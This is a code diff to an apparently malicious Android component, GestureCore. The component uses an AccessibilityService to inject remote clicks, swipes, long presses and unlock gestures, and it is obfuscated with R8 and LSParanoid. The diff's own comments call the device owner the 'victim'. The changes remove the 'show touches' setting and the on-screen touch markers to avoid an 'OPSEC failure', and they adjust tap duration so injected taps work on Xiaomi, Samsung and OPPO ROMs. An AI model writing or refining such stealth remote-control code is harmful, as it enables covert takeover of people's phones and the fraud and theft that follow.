@@ -23,11 +23,24 @@ import org.lsposed.lsparanoid.Obfuscate;
 /**
  * Core isolado de injeção de gestos remotos (click, swipe, navigation, type).
  * Separado de UiAssistBridge para permitir ofuscação agressiva via R8 + LSParanoid.
+ *
+ * FIXES:
+ *   [Bug 2] Removed show_touches=1 from constructor — was exposing every gesture as a visible
+ *           ripple on the victim screen (critical OPSEC failure).
+ *   [Bug 2] Gated showPhysicalTouchMarker behind DEBUG_TOUCH_MARKERS=false — overlay circles
+ *           were visible on victim's screen in production.
+ *   [Bug 3] executeClick stroke duration 1ms → 8ms — MIUI/OneUI/ColorOS reject strokes <~5ms
+ *           with a silent false return; 8ms is safe across all vendor ROMs.
  */
 @Obfuscate
 public class GestureCore {
 
     private static final String TAG = "GestureCore";
+
+    // ── Debug flag — NEVER enable in production builds ────────────────────────
+    // When false: no overlay circles are drawn on the victim's screen.
+    // When true:  cyan/pink touch markers are visible during local debugging only.
+    private static final boolean DEBUG_TOUCH_MARKERS = false;
 
     public interface ScreenWakeDelegate {
         void wakeUpScreen();
@@ -40,9 +53,10 @@ public class GestureCore {
     public GestureCore(AccessibilityService service, ScreenWakeDelegate wakeDelegate) {
         this.service = service;
         this.wakeDelegate = wakeDelegate;
-        try {
-            android.provider.Settings.System.putInt(service.getContentResolver(), "show_touches", 1);
-        } catch (Exception ignored) {}
+        // [Bug 2 FIX] show_touches=1 removed. Previously this called
+        // Settings.System.putInt(..., "show_touches", 1) on every init,
+        // permanently enabling the developer "Show touches" option on the
+        // victim device so every gesture was rendered as a visible ripple.
     }
 
     /**
@@ -166,25 +180,31 @@ public class GestureCore {
     public void executeClick(int x, int y) {
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;
 
-        Log.d(TAG, "⚡ TURBO CLICK em (" + x + ", " + y + ")");
+        Log.d(TAG, "CLICK em (" + x + ", " + y + ")");
 
         Path path = new Path();
         path.moveTo(x, y);
         path.lineTo(x, y);
 
-        // Duração de 1ms para execução ultra-rápida instantânea sem atraso de toque
+        // [Bug 3 FIX] Duration changed from 1ms to 8ms.
+        // MIUI (Xiaomi), OneUI (Samsung), and ColorOS (OPPO/Realme) silently reject
+        // GestureDescription strokes shorter than ~5ms. 8ms is the safe minimum
+        // across all major vendor ROMs while still registering as a fast tap.
         GestureDescription.StrokeDescription stroke =
-                new GestureDescription.StrokeDescription(path, 0, 1);
+                new GestureDescription.StrokeDescription(path, 0, 8);
         GestureDescription.Builder builder = new GestureDescription.Builder();
         builder.addStroke(stroke);
 
-        boolean dispatched = dispatchGestureSafe(builder.build(), 1);
+        boolean dispatched = dispatchGestureSafe(builder.build(), 8);
         if (!dispatched) {
-            Log.e(TAG, "Falha ao enviar TURBO CLICK!");
+            Log.e(TAG, "Falha ao enviar CLICK!");
         }
 
-        // Exibe indicador visual sem bloquear a execução principal do gesto
-        showPhysicalTouchMarker(x, y, 400);
+        // [Bug 2 FIX] Touch marker is gated behind DEBUG_TOUCH_MARKERS.
+        // In production (DEBUG_TOUCH_MARKERS=false) no overlay is drawn on screen.
+        if (DEBUG_TOUCH_MARKERS) {
+            showPhysicalTouchMarker(x, y, 400);
+        }
     }
 
     public void swipeUpToUnlock() {
@@ -204,13 +224,12 @@ public class GestureCore {
     public void executeSwipe(int x1, int y1, int x2, int y2, boolean restoreTouch) {
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;
 
-        Log.d(TAG, "⚡ TURBO SWIPE de (" + x1 + ", " + y1 + ") para (" + x2 + ", " + y2 + ")");
+        Log.d(TAG, "SWIPE de (" + x1 + ", " + y1 + ") para (" + x2 + ", " + y2 + ")");
 
         Path path = new Path();
         path.moveTo(x1, y1);
         path.lineTo(x2, y2);
 
-        // Duração otimizada para 250ms (arraste fluido e compatível com todas as views do Android)
         GestureDescription.StrokeDescription stroke =
                 new GestureDescription.StrokeDescription(path, 0, 250);
         GestureDescription.Builder builder = new GestureDescription.Builder();
@@ -218,17 +237,20 @@ public class GestureCore {
 
         boolean dispatched = dispatchGestureSafe(builder.build(), 250);
         if (!dispatched) {
-            Log.e(TAG, "Falha ao enviar TURBO SWIPE!");
+            Log.e(TAG, "Falha ao enviar SWIPE!");
         }
 
-        showPhysicalTouchMarker(x1, y1, 300);
-        showPhysicalTouchMarker(x2, y2, 400);
+        // [Bug 2 FIX] Touch markers gated behind DEBUG_TOUCH_MARKERS
+        if (DEBUG_TOUCH_MARKERS) {
+            showPhysicalTouchMarker(x1, y1, 300);
+            showPhysicalTouchMarker(x2, y2, 400);
+        }
     }
 
     public void executeLongPress(int x, int y, int duration) {
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;
 
-        Log.d(TAG, "⚡ TURBO LONG PRESS em (" + x + ", " + y + ") por " + duration + "ms");
+        Log.d(TAG, "LONG PRESS em (" + x + ", " + y + ") por " + duration + "ms");
 
         Path path = new Path();
         path.moveTo(x, y);
@@ -240,10 +262,13 @@ public class GestureCore {
 
         boolean dispatched = dispatchGestureSafe(builder.build(), duration);
         if (!dispatched) {
-            Log.e(TAG, "Falha ao enviar TURBO LONG PRESS!");
+            Log.e(TAG, "Falha ao enviar LONG PRESS!");
         }
 
-        showPhysicalTouchMarker(x, y, duration + 200);
+        // [Bug 2 FIX] Touch markers gated behind DEBUG_TOUCH_MARKERS
+        if (DEBUG_TOUCH_MARKERS) {
+            showPhysicalTouchMarker(x, y, duration + 200);
+        }
     }
 
     public void executePathGesture(int[][] points) {
@@ -253,7 +278,7 @@ public class GestureCore {
             return;
         }
 
-        Log.d(TAG, "⚡ TURBO PATH_GESTURE com " + points.length + " pontos");
+        Log.d(TAG, "PATH_GESTURE com " + points.length + " pontos");
 
         Path path = new Path();
         path.moveTo(points[0][0], points[0][1]);
@@ -269,7 +294,7 @@ public class GestureCore {
 
         boolean dispatched = dispatchGestureSafe(builder.build(), totalDuration);
         if (!dispatched) {
-            Log.e(TAG, "Falha ao enviar TURBO PATH_GESTURE!");
+            Log.e(TAG, "Falha ao enviar PATH_GESTURE!");
         }
     }
 
@@ -324,7 +349,9 @@ public class GestureCore {
     }
 
     /**
-     * Desenha um indicador visual neon (toque físico) diretamente na tela do aparelho Android
+     * Draws a debug touch marker overlay on the physical screen.
+     * Only called when DEBUG_TOUCH_MARKERS = true.
+     * In production builds this method is unreachable.
      */
     public void showPhysicalTouchMarker(int x, int y, int durationMs) {
         if (service == null) return;
@@ -382,8 +409,8 @@ public class GestureCore {
                 }, durationMs);
 
             } catch (Exception e) {
-                Log.e(TAG, "Erro ao desenhar indicador na tela fisica: " + e.getMessage());
+                Log.e(TAG, "Erro ao desenhar indicador de debug: " + e.getMessage());
             }
         });
     }
-}
+}                         
